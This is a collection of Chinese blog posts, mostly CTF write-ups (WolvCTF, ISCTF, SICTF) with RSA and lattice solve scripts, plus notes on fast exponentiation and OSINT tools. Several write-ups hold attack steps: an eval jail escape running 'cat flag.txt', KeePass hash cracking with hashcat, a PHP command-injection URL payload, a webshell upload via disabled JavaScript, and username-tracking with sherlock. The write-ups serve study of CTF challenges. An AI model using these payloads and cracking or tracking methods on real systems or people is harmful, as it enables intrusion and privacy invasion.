[{"title":"2025.03.wolvctf-wp.md","path":"/posts/baebdd08.html","content":"比赛时间 250322-250326 Benginner REverse OverAndOver - Crypto 直接丢进Cyberchef base64一直解密得到flag EtTuCaesar - Crypto PicturePerfect - Forensics 右键查看图片的属性后在详细信息中可以看到flag DigginDir - Forensics 解压后估计flag存在某个目录下的文本文件中，使用windows的findstr命令查找flag的开头wctf findstr /s &quot;wctf&quot; * p0wn3d - Pwn 题目代码如下 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;struct __attribute__((__packed__)) data &#123; char buf[32]; int guard;&#125;;void ignore(void)&#123; setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stdin, NULL, _IONBF, 0);&#125;void get_flag(void)&#123; char flag[1024] = &#123; 0 &#125;; FILE *fp = fopen(&quot;flag.txt&quot;, &quot;r&quot;); fgets(flag, 1023, fp); printf(flag);&#125;int main(void)&#123; struct data first_words; ignore(); /* ignore this function */ printf(&quot;Hello little p0wn3r. Do you have any first words? &quot;); fgets(first_words.buf, 64, stdin); sleep(2); puts(&quot;Man that is so cute&quot;); sleep(2); puts(&quot;I remember last year people were screaming at the little p0wn3rs.. like AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!&quot;); sleep(2); puts(&quot;Don&#x27;t worry little one. I won&#x27;t let them do that to you. I&#x27;ve set up a guard&quot;); if (first_words.guard == 0x42424242) &#123; get_flag(); &#125; return 0;&#125; 代码中，定义了一个结构体，前32位为buf，后面为guard，而在main函数中，由于给buf赋值时限制大小为，所以在给buf赋值32字节的A之后，加上4字节的B，会使多余的数据溢出至guard Forensics Passwords 下载到.kdbx文件，搜索后为KeePass的数据文件，遂使用keepass2john Database.kdbx &gt;&gt; hash.txt 得到keepass密码的hash 再使用hashcat进行爆破（需要将前面的&quot;Database：&quot;删去） hashcat -m 13400 hash.txt -a 0 rockyou.txt 得到密码为： 随后拿密码进入keepass中翻找一番即可得到flag Active 1: Domain Access 第一段 dan用户的桌面上有木马文件以及一些输出文件，asreproast的输出中有第一段flag，还找到了emily用户密码的hash Misc Eval is Evil 题目如下： 123456789101112131415import randomdef main(): print(&quot;Let&#x27;s play a game, I am thinking of a number between 0 and&quot;, 2 ** 64, &quot; &quot;) try: guess = eval(input(&quot;What is the number?: &quot;)) except: guess = 0 correct = random.randint(0, 2**64) if (guess == correct): print(&quot; Correct! You won the flag!&quot;) flag = open(&quot;flag.txt&quot;, &quot;r&quot;).readline() print(flag) else: print(&quot; You lost lol&quot;)main() 发现是没有进行过滤的pyjail，直接__import__(&quot;os&quot;).system(&quot;cat flag.txt&quot;)秒了"},{"title":"信息搜集的艺术","path":"/posts/244cb481.html","content":"资产搜集 icp备案 天眼查：https://www.tianyancha.com/ ICP备案查询网：http://www.beianbeian.com/ 国家企业信用信息公示系统：http://www.gsxt.gov.cn/index.html 爱站的备案查询：https://icp.aizhan.com 备案历史：https://icplishi.com/ icpsearch 工具地址 https://github.com/A10ha/ICPSearch.git 工具用法 查询单个域名/公司备案信息 ICPSearch.exe -d XXX.com ICPSearch.exe -d XXX公司 子域名搜集 人员搜集 大多数人会习惯在社交网站上使用一个用户名，可利用此习惯对特定用户搜集其他社交平台信息 在国内若掌握其常用手机号码也可通过社交平台可能认识的人搜集 sherlock 工具地址 https://github.com/sherlock-project/sherlock 工具用法 Sherlock test"},{"title":"2024-11-ISCTF-Crypto-wp","path":"/posts/4edcf23d.html","content":"Crypto 我和小蓝鲨的秘密 简单阅读代码后发现是将原图片每个像素点的r,g,b值进行加密，加密过程中n的值较小，直接分解即可，简单的rsa解密过程，之后将原始图片的r,g,b还原即可 1234567891011121314151617181920212223from Crypto.Util.number import *from PIL import Imageimport numpy as npn = 29869349657224745144762606999p=160216064374859q=186431677583461e =65537phi = (p-1)*(q-1)d = inverse(e,phi)def decry(c): m = pow(c,d,n) return mdata = np.load(r&quot;encrypted_image.npy&quot;,allow_pickle=True)h = 2065w = 712image = Image.new(&quot;RGB&quot;, (w,h))for i in range(w): for j in range(h): r = decry(data[i, j, 0]) g = decry(data[i, j, 1]) b = decry(data[i, j, 2]) image.putpixel((i, j), (r, g, b))image.save(&quot;custom_rgb_image.png&quot;) ChaCha20-Poly1305 这道题比较简单，只需要知道crypto库的使用以及能看出key？.txt文件中是base92加密的结果即可 12345678910from Crypto.Cipher import ChaCha20_Poly1305key = bytes.fromhex(&quot;173974535637a5ef30a116b03d00bd2fe751951ca3eaa62daec2b8f5ca5b6135&quot;)Encrypted_Flag = bytes.fromhex(&quot;20408b9fc498063ad53a4abb53633a6a15df0ddaf173012d620fa33001794dbb8c038920273464e13170e26d08923aeb&quot;)Tag=bytes.fromhex(&quot;70ffcc508bf4519e7616f602123c307b&quot;)Nonce=bytes.fromhex(&quot;d8ebeedec812a6d71240cc50&quot;)cipher = ChaCha20_Poly1305.new(key=key, nonce=Nonce)flag = cipher.decrypt_and_verify(Encrypted_Flag, Tag)print(flag) 蓝鲨的费马 参考风二西大佬的视频https://www.bilibili.com/video/BV1po4y1E7az/?spm_id_from=333.999.0.0 首先进行推导 leak=(d+(pow(p,q,n)+pow(q,p,n)))leak = (d+(pow(p,q,n)+pow(q,p,n))) leak=(d+(pow(p,q,n)+pow(q,p,n))) 由于p，q均小于n，将 qp≡1mod qpq≡1mod pq^p \\equiv 1 \\mod q \\\\ p^q \\equiv 1 \\mod p qp≡1modqpq≡1modp 得到 leak=(d+p+q)mod nleak = (d + p +q) \\mod n leak=(d+p+q)modn 因为 cd≡m(mod n)d=leak−(p+q)c^d \\equiv m (\\mod n)\\\\ d = leak - (p+q) cd≡m(modn)d=leak−(p+q) 所以推得 cl−(p+q)≡m(mod n)c^{l-(p+q)} \\equiv m (\\mod n) cl−(p+q)≡m(modn) 由 phi=(p−1)∗(q−1)phi = (p-1)*(q-1) phi=(p−1)∗(q−1) 推得 phi=n+1−(p+q)phi = n+1-(p+q) phi=n+1−(p+q) 根据欧拉定理： aϕ(m)≡1(mod )a^{\\phi(m)} \\equiv 1 (\\mod) aϕ(m)≡1(mod) 所以 cphi≡1(mod n)cn+1−(p+q)≡1(mod n)cn+1∗c−(p+q)≡1(mod n)c(n+1)∗c−(p+q)∗cp+q≡c(p+q)(mod n)c^{phi} \\equiv 1(\\mod n)\\\\ c^{n+1-(p+q)} \\equiv 1 (\\mod n)\\\\ c^{n+1}*c^{-(p+q)} \\equiv 1(\\mod n)\\\\ c^{(n+1)}*c^{-(p+q)}*c^{p+q} \\equiv c^{(p+q)}(\\mod n) cphi≡1(modn)cn+1−(p+q)≡1(modn)cn+1∗c−(p+q)≡1(modn)c(n+1)∗c−(p+q)∗cp+q≡c(p+q)(modn) 所以 cn+1≡cp+qmod ncleak∗c−(n+1)≡mmod ncleak∗c−(p+q)≡mmod ncleak−(p+q)≡mmod nc^{n+1} \\equiv c^{p+q} \\mod n\\\\ c^{leak}*c^{-(n+1)}\\equiv m \\mod n\\\\ c^{leak}*c^{-(p+q)} \\equiv m \\mod n\\\\ c^{leak-(p+q)} \\equiv m \\mod n cn+1≡cp+qmodncleak∗c−(n+1)≡mmodncleak∗c−(p+q)≡mmodncleak−(p+q)≡mmodn 搓脚本 1234567c= 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997n= 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247leak= 9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881from Crypto.Util.number import *m = pow(c,leak-n-1,n)print(long_to_bytes(m)) 小蓝鲨的数学题 参考 2020网鼎杯 you raise me up 根据题目条件和提示，我们已知 c=pow(m,flag,p)c = pow(m,flag,p) c=pow(m,flag,p) 利用sagemath解题 123456m = 5321153468370294351697008906248782883193902636120413346203705810525086437271585682015110123362488732193020749380395419994982400888011862076022065339666193c = 7383779796712259466884236308066760158536557371789388054326630574611014773044467468610300619865230550443643660647968413988480055366698747395046400909922513p = 2**512d=discrete_log(c,mod(m,p))import libnumprint(libnum.n2s(int(d))) 小蓝鲨的密码 下载附件后发现一个压缩包与类似rabbit/AES密文和图片，经过尝试压缩包密码为图片的名字，打开压缩包后是密码本，观察其中的密码后，根据往年经验，密码应该为blueshark或者isctf2024，前者上一步已经用过，所以尝试密码为isctf2024，发现AES成功解密。 小蓝鲨的方程 题目中生成的p1为 p1=p4+ap_1 = p^4 +a p1​=p4+a a只有777为，对其开4次方后只有5，位数较小，所以可以在对p1开4次方之后递减得到p，之后根据欧拉函数得到phi，算出s的值，之后通过二项式定理以及数论推导，搓脚本 123456789101112131415161718192021c1= 671390498592586008552998377599101093977542184109077889081448730480869018650843045119891777468161631085086340705902115332025675787789530562679603254577287153918966364523848382506106179394235772395029788721306186952016420794804145631124905952103136061076643266886961178241381892015555099638200222249447194504082451341122502519637821695210573997670753981061458264118355417889153180841281073262935937836447460470926729282834006229571453935760593644658459098721652426154970766417292435960463905367868753821950303919781798234432998272038029063155193184039985018137026245365188171178677898869374676546799536208952198558258306460302868688355653022725288744014143221560882404431652751343944983442109327c = 8641190030376811670503537177719719233418166235794962118828671236836174132083208517733734760455990850156371205118391537919769888760384574011411232571257192285256730733174399297826587479261381970232162702657952399683882650083181048279650913795429823628186888540572704055008102853692060360140858142686334722286525699998854566609078547487420929457446776757558492454916447188774943818970599916514467335772992690805247630814156710861067503956707301402347944233660194395192354000788262111000900574820275786269075882923600474781645848712157460135387134196156906258218217831988828360827613420801773911833194097791649069743116686685667300622630909231822986237104627385544169938138006242341269672868611269202418482629393372933567053272565557137741441902377611003983050084491513897727856173625922194300103448148829004025229567101761111396110940066254801762424343522707712480796358754008120503317686600144600226149617189681233392693738216138797012278242152852923361635415564580582002132107424154426980566696622448291815571736676562214017436n = 1076246859437269645898003764327104347852443049519429833372038915264009774423737482018987571807662568251485615769880354898666799006772572239466617428164721157850526408878346223839884319846641438292436373441749602341461361190584638190903978829024853974880636148520803145113551453821058269641304504880310836801494499720662704717315748614372503735165114899680682056477494953525794354656896362929510309669119173103242509398650608116835276076364248473952717811633756784397347121601006659623317417388283638159905288128181587304367489096254611610975352096229116491567502061775862811850081040850421151385474249060884479729988512713640536139010928836126719149031115182144744359297169350288886555784650111p1 = 145356063641618996012874664536921616978986640263438210169671010403677822239343590475177543891188656103067696467174379510912427160232486984044862545338401652910975162942038201716552753723984593267892098222213049269335313670049037479410635628460505327693176152061750827570561482918795206276991967169087371403553e=65537from Crypto.Util.number import *from gmpy2 import *p_ = iroot(p1,4)[0]while True: q_ = n // p_ if p_ * q_ == n: p = int(p_) q = int((iroot(q_,4))[0]) break p_ -= 1phi = (p-1)*(q**4-q**3)d = inverse(e,phi)s = pow(c1,d,n)print(s)m1 = (c-1)//(s**3)print(long_to_bytes(m1)) 蓝鲨的RSA 查看hint后发现，是维纳定理 根据连分数定理 ∣a−cd∣&lt;12∗d2\\left| a- \\frac{c}{d} \\right|&lt; \\frac{1}{2*d^2} ∣∣∣∣​a−dc​∣∣∣∣​&lt;2∗d21​ 可得c/d是a的一个连分数近似 推导： leak=8∗H∗P−116∗P∗P=8∗H∗P16∗P∗P−116∗P∗P=H2∗P−116∗P∗Pleak=\\frac{8*H*P-1}{16*P*P}=\\frac{8*H*P}{16*P*P}- \\frac{1}{16*P*P}=\\frac{H}{2*P}-\\frac{1}{16*P*P} leak=16∗P∗P8∗H∗P−1​=16∗P∗P8∗H∗P​−16∗P∗P1​=2∗PH​−16∗P∗P1​ 给leak*2得到 leak∗2=HP−18∗P∗P∣leak∗2−HP∣=18∗P∗P&lt;12∗P∗Pleak*2 = \\frac{H}{P}-\\frac{1}{8*P*P}\\\\ \\left|leak*2-\\frac{H}{P} \\right|= \\frac{1}{8*P*P}&lt;\\frac{1}{2*P*P} leak∗2=PH​−8∗P∗P1​∣∣∣∣∣​leak∗2−PH​∣∣∣∣∣​=8∗P∗P1​&lt;2∗P∗P1​ 计算leak*2的连分数即可得到h，p 下一步是基本的格密码 已知 h=f−1∗g(mod p)h∗f≡g(mod p)g=hf−kph = f^{-1}*g (\\mod p)\\\\ h*f \\equiv g (\\mod p)\\\\ g = hf-kp h=f−1∗g(modp)h∗f≡g(modp)g=hf−kp 于是构造格 (f−k)∗(1h0p)=(fg)\\begin{pmatrix} f&amp;-k \\end{pmatrix}* \\begin{pmatrix} 1&amp;h\\\\ 0&amp;p \\end{pmatrix} = \\begin{pmatrix} f&amp;g \\end{pmatrix} (f​−k​)∗(10​hp​)=(f​g​) exp: 12345678910111213141516171819202122c = 587245179027322480379581200283415189810421958968516831191660631552695197401940961725169763339428980298128692606951200581483431566182271569207988054537414289564013883171160614196522169980339024564884190765084419167938640701193928669hint = 0.2427542737153618793334900104191212626446625872340179613972610728976081994921862517310186626304527115125924716035632505287111236596234811779375148657365336957626454491865164520834975233144235103885081268955448330597818844340656652982593545877449810282619387305007246499089258519062093814083383071737897364213169497762760797899310673216754376885295598952272100016962368762532805864796748393317534908268379601445004775495237901072144236328105526403608646831124542336002540011176406194984370372589752234640498423911217119220030242197564695880261480071310815379681250975672935544404797155655708441222387631967447088319826137200280810029390387418159394276760100487636516708987579464183208860911063948902432948269805493252899815187044807603000344378890835564906163242023600624338694473573763088471321731611077227112205396909637906507673367598721218000123789690455125909411309668615810240938664264212370815385282488986625554704015828254539339719586211726300858711328516487805251366293457402531199532556110786048074755505680210260049n = 839799159583571337450826982895478997157381520448790705455708438948150905361244823725400304016136863419723271227616684280477524669207590477657886623628732394537008838314015048569652202355464477680540884654473950183135276735347866051e = 65537hint = hint *2from Crypto.Util.number import *cf = continued_fraction(hint)for i in range(1000): k = cf.numerator(i) x = cf.denominator(i) if isPrime(x) and x.bit_length()==512: print(k,x) h,p = k,xGe = Matrix(ZZ,[[1,h],[0,p]])print(Ge.LLL())f,g = Ge.LLL()[0]f,g = abs(f),abs(g)print(f,g)q = n //fphi = (f-1)*(q-1)d = inverse(e,phi)print(long_to_bytes(pow(c,d,n))) ezmath 根据题目给出的代码，是需要计算gamma函数当x取值为5/2时，使用在线计算器计算出的结果不是需要的key，但是应该差别不大，所以我们进行一个爆破 12345678910111213141516171819202122232425262728293031323334key = 3293403881791372ke1 = 3293403881738537ke2 = 3293403881791370s = b&quot;n2SQK64JMsXstCtZurBiz81pMr3ZmgMjhuyL67hssm3shqJGYGfS/mWubINeE5HZ&quot;import randomfrom hashlib import md5import base64from Crypto.Cipher import AESimport tqdmdef pad(data): data = data.encode(&#x27;utf8&#x27;) while len(data) % 16 != 0: data += b&#x27;\\x00&#x27; return datadef decode(key, enc_data): mode = AES.MODE_ECB aes = AES.new(pad(key), mode) enc_data = base64.decodebytes(enc_data) decrypted_data = aes.decrypt(enc_data) return decrypted_datafor key in tqdm.trange(329340360000000,329340399999999): key1 = key random.seed(key1) new_key = md5(str(random.getrandbits(256)).encode(&#x27;utf-8&#x27;)).hexdigest() en_m = decode(new_key, s) if b&#x27;ISCTF&#x27; in en_m: print(en_m) print(new_key) break 最后根据提示发现应该是修改好代码后计算出来的key取前15位"},{"title":"数论-快速幂运算","path":"/posts/a9fc6368.html","content":"快速幂运算 幂运算$$a^m$$是指m个n相乘，当a，m太大时，计算时间太长，使用快速幂算法可以降低时间复杂度。常见的算法有二进制与指数折半两种，时间复杂度相同 首先我们知道 $ a^{m+n} = a^m *a^n $ 二进制的方法就是通过指数的二进制表示将幂运算拆解为一个个很小的任务 指数折半就是将指数分解为2的m次方形式，例如 $ 3^{12} = (3^2)^3 = 9^3 $ 通过缩小指数的大小，减少循环的次数，以此来达到幂运算的结果不变但是加快幂运算速度的效果。 二进制取幂 当n的m次方中，m取9时，9的二进制为1001，转化关系如下： 9=1∗23+0∗22+0∗21+1∗209 = 1*2^3+0*2^2+0*2^1+1*2^0 9=1∗23+0∗22+0∗21+1∗20 于是，通过幂运算的性质，原本的复杂的幂运算可以拆分为 n9(10)=n1001(2)=n1∗23+0∗22+0∗21+1∗20=n1∗23∗n0∗22∗n0∗21∗n1∗20n^{9_{(10)}} = n^{1001_{(2)}} = n^{1*2^3+0*2^2+0*2^1+1*2^0}=n^{1*2^3}*n^{0*2^2}*n^{0*2^1}*n^{1*2^0} n9(10)​=n1001(2)​=n1∗23+0∗22+0∗21+1∗20=n1∗23∗n0∗22∗n0∗21∗n1∗20 由于我们知道任何数乘0都为0，任何数的0次方都为1，所以，实际上拆分的幂运算为 n9=n1∗23∗n1∗20n^9 = n^{1*2^3}*n^{1*2^0} n9=n1∗23∗n1∗20 由此发现，实际上只需要计算众多小任务中二进制位等于1部分的累乘即可 实现代码 12345678def binpow(a, b): res = 1 while b &gt; 0: if b &amp; 1: res = res * a a = a * a b &gt;&gt;= 1 return res 矩阵快速幂运算 根据线性代数中我们学到的知识，矩阵乘法的原理就是左行乘右列，这里不多描述，代码实现如下 12345678910for(i=1;i&lt;=n;i++)&#123; for(j=1;j&lt;=n;j++) &#123; for(k=1;k&lt;=n;k++) &#123; c[i][j] = c[i][j] + a[i][k] * b[k][j]; &#125; &#125;&#125; 将矩阵乘法套在快速幂运算中，也就构成了矩阵快速幂运算 12345678910111213def multiply_matrices(a, b): res = [[0, 0], [0, 0]] for i in range(0, 2): for j in range(0, 2): for p in range(0, 2): res[i][j] = (res[i][j] + a[i][p] * b[p][j]) % M return resb = 次方数while b &gt; 0: if b &amp; 1: ans = multiply_matrices(ans, base) base = multiply_matrices(base, base) b &gt;&gt;= 1 例题 2024.11.SICTF#Round4.Math Cocktail 题目 123456789from secret import keyx = keyM = 94665789456132156456789461321289656332321n = 123456789123456789k = x + pow(x,-1,M)result = pow(x,n,M) + pow(x,-n,M)print(&quot;k = &quot; + str(k))flag = &quot;SICTF&#123;&quot;+str(result)+&quot;&#125;&quot;#k = 15396893775857205606087136852231851457937 根据题意，我们需要求 result=xn+xn−1result = x^n + x^{n-1} result=xn+xn−1 我们已知 k=x+x−1k = x + x^{-1} k=x+x−1 于是，设 an=xn+xn−1a_n = x^n +x^{n-1} an​=xn+xn−1 我们有 a0=2a1=ka_0 = 2\\\\ a_1 = k a0​=2a1​=k 我们又知道 an∗a1=(xn+xn−1)∗(x+x−1)=xn+1+x−(n+1)+xn−1+x−(n−1)=an+1+an−1an+1=k∗an−an−1an=k∗an−1−an−2a_n*a_1 = (x^n+x^{n-1})*(x+x^{-1})= x^{n+1}+x^{-(n+1)}+x^{n-1}+x^{-(n-1)}=a_{n+1}+a_{n-1}\\\\ a_{n+1} = k*a_n - a_{n-1}\\\\ a_{n} = k*a_{n-1} - a_{n-2} an​∗a1​=(xn+xn−1)∗(x+x−1)=xn+1+x−(n+1)+xn−1+x−(n−1)=an+1​+an−1​an+1​=k∗an​−an−1​an​=k∗an−1​−an−2​ 之后将递推关系转化为矩阵乘法 (anan−1)=(k−110)(an−1an−2)\\begin{pmatrix} a_n \\\\ a_{n-1} \\end{pmatrix} = \\begin{pmatrix} k &amp; -1 \\\\ 1 &amp; 0 \\end{pmatrix} \\begin{pmatrix} a_{n-1} \\\\ a_{n-2} \\end{pmatrix} (an​an−1​​)=(k1​−10​)(an−1​an−2​​) exp 12345678910111213141516171819def multiply_matrices(a, b): res = [[0, 0], [0, 0]] for i in range(0, 2): for j in range(0, 2): for p in range(0, 2): res[i][j] = (res[i][j] + a[i][p] * b[p][j]) % M return resM = 94665789456132156456789461321289656332321n = 123456789123456789k = 15396893775857205606087136852231851457937base = [[k, 1], [-1, 0]]ans = [[(k*k-2) % M, k % M], [0, 0]]b = n - 2while b &gt; 0: if b &amp; 1: ans = multiply_matrices(ans, base) base = multiply_matrices(base, base) b &gt;&gt;= 1print((ans[0][0] + M) % M)"},{"title":"rsa-smooth攻击","path":"/posts/148dea62.html","content":"涉及知识点 光滑数：指能分解成小素数乘积的正整数 B-光滑数：若一个光滑数的最大小质数因子&lt;=B,则称该光滑数为B-光滑数 费马小定理: p-1光滑 由于p为质数，设a为整数且与p互质，则有 又因为p-1为因子互不相同的B-光滑数，所以 故p的倍数可以求出来，且我们有n=p*q。所以 Pollard’s p-1 由于我们只关注gcd的结果，不需要计算B！的值，我们只需要令B=1，2，3，…,计算出gcd结果即可 12345678910111213from gmpy2 import *a = 2n = 2while True: a = powmod(a, n, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res d = invert(e, (res-1)*(q-1)) m = powmod(c, d, N) print(m) break n += 1 p+1光滑 Williams’s p + 1 12345678910111213141516171819def mlucas(v, a, n): &quot;&quot;&quot; Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot; v1, v2 = v, (v**2 - 2) % n for bit in bin(a)[3:]: v1, v2 = ((v1**2 - 2) % n, (v1*v2 - v) % n) if bit == &quot;0&quot; else ((v1*v2 - v) % n, (v2**2 - 2) % n) return v1for v in count(1): for p in primegen(): e = ilog(isqrt(n), p) if e == 0: break for _ in xrange(e): v = mlucas(v, p, n) g = gcd(v-2, n) if 1 &lt; g &lt; n: return g # g|n if g == n: break"},{"title":"2024.10.SICTF#Round4-wp","path":"/posts/e8559c8.html","content":"Misc 模型的秘密 使用字典爆破压缩包密码 搜索blend找到与3D文件格式有关的blender 发现题目附件中文件头被更改，修改之后使用blender打开查看flag 派森 根据音译，文件为py文件，修改后缀后发现代码也被音译，还原大致代码 123456from import xorfrom import *flag = &quot;************&quot;int = []for i in range(0,len(),4): int.append(xor(ord(flag[i]),ord(flag[i+2]))) 差不多就是将flag每四个分为一组，第一位与第三位进行异或，第二位和第四位异或，密文中含有第三位和第四位。异或即可得到flag的原文。 签到 关注公众号即可 Crypto SignBase base64即可 Smooth 根据代码，n首先是小素数的乘积，之后＋1，所以p-1是光滑的，使用smooth攻击 exp： 123456789101112131415161718192021from Crypto.Util.number import *N = 11353462911659482113796537452147300926058319193410149519981293344545095869273822230953023429933867057788424748612924709948861133348747189832397098293375764081790597820832766019459982124608221261607650511397189714784056313299551817534654742174637343804047231232241364089289257964139944018168155573510980260130960125621306919129390727418251555408239157881843225479158237727969284756513805560836003067115936987292751142016846824024901372913577548599978847860303760659677939193351221798796221804998385095596961591093782162020167439948314063423204757741472210008357888290333170757522814768955797167174930629344666183821709125207308525214263797625499327774875517941662523738827284067304929843343871569023248931759251331056863803201916908875256305736551124386988450879913404808869417817363510363373493093139804372817316366990863872781848240937733101758906281563575413208242901819275013539759479445299894840593737457394207415306989963459347994339058584475533786264375696277942369426844216474662828121334192775480587740071776080691560820922589751966526187341539255661442517814436944781114380877453502120302247547983180059537220197840688418898830571100216529994749464486853212098379822895838120836692532849021875818941979891105837972315129986493c = 4598142980961588614870523368474306387497434303187254927457676265871592231881441246092917258758503624096206624791819316260705668875764048374035213672138915662719877795747211803584360349151646264274341548770123417923229997374982757324397146348908248704115062655445309042278469908831635522908894918382861563762003781223067210316435231509359575745828484177064520417698784251000631935361105284031848497200100561554984257265297077176545082009710252149167922123535451717313588884862304552508619154651546264753192894485610685402565486840707709012364088270364787452130288293053818329408433642977483320525542674345001200312959241276966417288770125166249156122793451000156544563900072606708005901579238109781720805374132101363788622676000360345128868422751829657184702090198806325558601552728909032627597688702884484377994243047876011323705947461799669488497113582621976154428096812072612119422667669321557427061098391558516935530727451865151957035156100271891977310043273298085691419672779758845492888551759393825925266903887942750052210444677062600227218953570162640164207895883301679126000642791876167281967081725589618329012476305157314322062703122134504285038691938912783524944917966615556902938825590064899700174139252191278691620663355243e = 65537import gmpy2a = 2n = 2while True: a = pow(a, n, N) res = gmpy2.gcd(a-1, N) if res != 1 and res != N: q = N // res print(&quot;n=&quot;,n) print(&quot;p=&quot;,res) print(&quot;q=&quot;,q) break n += 1d=gmpy2.invert(e,(res-1)*(q-1))m=pow(c,d,N)print(long_to_bytes(m)) next_prime 给了next_prime，直接使用费马分解拿到p，q 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import mathfrom Crypto.Util.number import *import gmpy2from Cryptodome.Util.number import *from gmpy2 import *n = 11958388191411693159737723233868177200642855312771636589272066925180521736238782088222469544720240237292008558651656242716943228927612911153093905350043065811853776453271082678856297734699816670221066298151571078839575715976634390967727901295936522621706645886864683564184184197808626753747618171580292981571324190267014128877345111473870762554461674841623076501341477084318792110624423283610948627697772395662746329206056210266975821093875870239401934123066690637191790327090291595067248967533200784706397544202070440488806825607916659163953805033205530899551496221506129549542556866837853127119809134360611350153589c = 10602368727908312334676265892975307612231309319511015017178654564186172749979627738052483995870388025140270600159107954524376993980949045647370337520644299969292550299798129717198074042121264370311983929042594290226321121639097714569204574387632530578153623781118813035223106106430716561113649761388347227207862016222328885951443891878767280730866193302995220736592745950808566359750940949520997722511969961743175777398751576595421456387998438214806188903746057855596476380404784738717555105866919649086601807350830108805521710188675565963765427930594177874353694184805979235854934856122125278853834603734029710968348gift = 143003048136494625720615623612005913472507924053937690079082986485649969355472743235179770036996193641198750946508667945561623931811236977039763581123681134310890547763107653222776992418543178066390387385209825190685606728024120446212807710589806258669458993047631033905702244902809204039169931629358263456702579067559691338668237882496453568585374905432631312417129535623987837367199215661733043851565981435234933986864857569158677737153423060041120732727135186371678287680926662892691327401787213342106281956461499522723795617869239148528294553548775690229067500104867437905746412645684721821428282431567702986879179533855920546700706123995719114359958306882907020982377260255340490340263938995699635287224549324332962230238510191824829224191551900441011605052418697617085549543103391184965537110312684637038510114533398510307173011690076219892318860903556489256383303693074652155424333388152193775840529985682153395008472897617946636734810609200156268438329402662168752285341847607694230848883249991722691539384542468611397615969487669898094687344847452861774236267516878551680397732564006255256825307533960791695267034807439791627895625581061889926276814228469856614838307012696777026973517086921078389474757196549594972814371353e = 65537def fermat_factorization(n):\tfactor_list = []\tget_context().precision = 2048\tx = int(math.isqrt(n))\twhile True: x += 1 y2 = x ** 2 - n if is_square(y2): y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break\treturn factor_listdef main():\tfactor_list = fermat_factorization(gift)\t#print(factor_list)\t[X1, Y1] = factor_list[0]\t[X2, Y2] = factor_list[1]\tp1 = gcd(X1, X2)\tq1 = X1 // p1\tp2 = gcd(Y1, Y2)\tq2 = Y1 // p2\tprint(&#x27;p1 =&#x27;,p1)\tprint(&#x27;p2 =&#x27;,p2)\tprint(&#x27;q1 =&#x27;,q1)\tprint(&#x27;q2 =&#x27;,q2)\tphi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1)\td = inverse(e, phi)\tflag = long_to_bytes(pow(c, d, n))\tprint(flag)if __name__ == &quot;__main__&quot;:\tmain() Web Sighin 进入靶机后查看robots.txt文件，提示访问/wh3re_1s_thi5_fl4g.php，访问后发现对php代码进行了混淆， 恢复原始代码 123456789101112131415s = &quot;wKq=1MDcLg6yYsrnRYivbO7JoWQ9rBhCZuo4DlZOS7_I5+t=UKzp0hdV1FNL2EFd/nxam3cTbPARsw+8Eky5XUpfH0MeTQ3JXtkGf9qj_4NmlHi/SeIVaCAgxGj26vW8PBzu&quot;a = s[72]+s[116]+s[76]+s[113]+s[124]+s[35]+s[104]+s[63]+s[91]+s[70]+s[24]+s[63]+s[113]b = s[38]+s[123]+s[115]+s[89]+s[96]+s[60]+s[75]+s[108]+s[32]+s[107]+s[37]+s[131]+s[38]+s[25]+s[75]+s[100]+s[63]+s[68]+s[57]+s[11]+s[70]+s[77]+s[3]+s[3]c = s[96]+s[89]+s[63]+s[62]+s[115]+s[74]+s[47]+s[47]e = payload = s[115]+s[65]+s[86]+s[39]+s[70]+s[4]+s[108]+s[124]+s[26]+s[65]+s[16]+s[116]+s[115]+s[103]+s[98]+s[77]+s[92]+s[48]+s[12]+s[44]+s[115]+s[62]+s[58]+s[55]+s[92]+s[37]+s[55]+s[40]+s[116]+s[71]+s[16]+s[83]+s[92]+s[48]+s[75]+s[23]+s[5]+s[74]+s[47]+s[47]h = s[17]+s[130]+s[106]+s[76]+s[113]+s[68]+s[75]+s[109]+s[55]+s[65]+s[26]+s[47]print(a,b,c,e,h)&quot;&quot;&quot;$f = base64_decode(&quot;Z2V0X2RlZmluZWRfdmFycw==&quot;) = get_defined_vars();$g = W3lc0me_t0_SICTF.2024$i = systemsystem( get_defined_vars()[_GET][W3lc0me_t0_SICTF.2024])&quot;&quot;&quot; 可见关键代码为system( get_defined_vars()[_GET][W3lc0me_t0_SICTF.2024])也就是get传参执行命令 但是get传进去的变量名中包含非法字符，根据搜索，可以通过转化错误，当参数中有中括号时，[被转化成_,且之后的非法字符不会被不会被转化为下划线，所以构建payload：[http://27.25.151.29:34141//wh3re_1s_thi5_fl4g.php?W3lc0me[t0_SICTF.2024=cat%20/flag] Upl0ad 文件上传题目，ctrl u 查看源代码后发现对于文件类型的转换在前端，只有要禁用js后即可上传木马文件 Reverse Exc?? 查看表格后发现需要将flag的ascii码套入公式后等于所给的值，直接爆破即可 